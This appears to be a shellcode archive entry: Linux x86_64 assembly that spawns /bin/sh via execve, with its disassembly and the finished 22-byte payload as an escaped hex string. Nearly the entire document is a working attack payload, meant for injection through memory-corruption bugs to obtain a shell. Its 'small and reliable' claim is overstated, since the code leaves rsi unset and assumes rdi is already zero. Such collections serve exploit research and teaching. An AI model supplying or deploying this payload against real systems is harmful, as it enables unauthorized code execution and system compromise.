;Category: Shellcode
;Title: GNU/Linux x86_64 - execve /bin/sh
;Author: Celal Doğan Duran - Arda Aslan 
;Date: 22/08/2024
;Architecture: Linux x86_64
; Small and reliable shellcode


[SECTION .text]
global _start
_start:
  xor rax, rax
  cdq 
  mov al, 59  
  mov rbx,0x68732f2f6e69622f 
  push rdi
  push rbx
  push rsp
  pop rdi
  syscall


   0x0000000000401000 <+0>:	xor    rax,rax
   0x0000000000401003 <+3>:	cdq
   0x0000000000401004 <+4>:	mov    al,0x3b
   0x0000000000401006 <+6>:	movabs rbx,0x68732f2f6e69622f
   0x0000000000401010 <+16>:	push   rdi
   0x0000000000401011 <+17>:	push   rbx
   0x0000000000401012 <+18>:	push   rsp
   0x0000000000401013 <+19>:	pop    rdi
   0x0000000000401014 <+20>:	syscall


22 Bytes Shellcode

\x48\x31\xC0\x99\xB0\x3B\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x53\x54\x5F\x0F\x05
